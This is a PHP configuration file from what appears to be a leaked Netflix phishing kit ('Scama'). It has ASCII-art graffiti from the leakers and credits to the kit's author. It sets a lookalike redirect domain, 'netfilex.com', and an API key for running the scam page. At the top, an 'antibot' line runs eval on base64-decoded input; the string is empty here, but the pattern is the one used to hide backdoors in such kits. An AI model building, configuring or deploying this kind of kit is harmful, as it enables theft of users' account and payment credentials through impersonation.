﻿<?php
//antibot Detect authentification
eval(base64_decode(""));	

//// This is your Scama Key if you post the scam will banned Don`t edit it =D
/*
▄▄▌  ▄▄▄ . ▄▄▄· ▄ •▄  ▄▄·       ·▄▄▄▄  ▄▄▄ .
██•  ▀▄.▀·▐█ ▀█ █▌▄▌▪▐█ ▌▪▪     ██▪ ██ ▀▄.▀·
██▪  ▐▀▀▪▄▄█▀▀█ ▐▀▀▄·██ ▄▄ ▄█▀▄ ▐█· ▐█▌▐▀▀▪▄
▐█▌▐▌▐█▄▄▌▐█ ▪▐▌▐█.█▌▐███▌▐█▌.▐▌██. ██ ▐█▄▄▌
.▀▀▀  ▀▀▀  ▀  ▀ ·▀  ▀·▀▀▀  ▀█▄▀▪▀▀▀▀▀•  ▀▀▀ 
FuCkEd By [!]DNThirTeen
https://www.facebook.com/groups/L34K.C0de/
*/
	/*
	# -> All Created By SH33NZ0
	# -> https://www.facebook.com/x.SH33NZ0
	# -> ICQ : 740936161
	# -> // : Scama config api
	*/
	// This is your Scama Key if you post the scam will banned Don`t edit it =D
	// ================================= //
	// ================================= //
	$redirectlink = "netfilex.com";	 	 // You must use redirect or the scam will not open
	// ================================= //
	// ================================= //
	// This is your Scama Key if you post the scam will banned Don`t edit it =D
	$API_KEY = "FUCKED_BY_DNTHIRTEEN_L34KC0DE_Netflix";
	// This is your Scama Key if you post the scam will banned Don`t edit it =D
	// ================================= //
	// This is your Scama Key if you post the scam will banned Don`t edit it =D
	// ================================= //
	// ================================= //


















